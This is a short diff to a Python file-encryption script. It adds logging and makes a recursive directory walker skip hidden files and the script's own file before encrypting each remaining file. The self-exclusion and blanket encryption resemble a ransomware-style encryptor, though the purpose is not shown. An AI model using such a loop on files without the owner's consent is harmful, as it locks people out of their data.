@@ -5,8 +5,11 @@ from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 import os
 import base64
+import logging
 
 import settings
+
+logger = logging.getLogger()
 
 
 def encrypt_file(path, key):
@@ -109,7 +112,14 @@ def recursive_file_action(path, fx, *args, **kwargs):
         for filename in filenames:
             # construct file path
             file_path = os.path.join(dirpath, filename)
-            fx(file_path, *args, **kwargs)
+            # don't encrypt hidden files
+            if filename[0] == ".":
+                print(f"skipping hidden file {file_path}")
+                continue
+            # don't encrypt itself
+            if file_path != settings.APPLICATION_FILE_PATH:
+                print(f"actioning on {file_path}")
+                fx(file_path, *args, **kwargs)
 
         for dirname in dirnames:
             # construct directory path
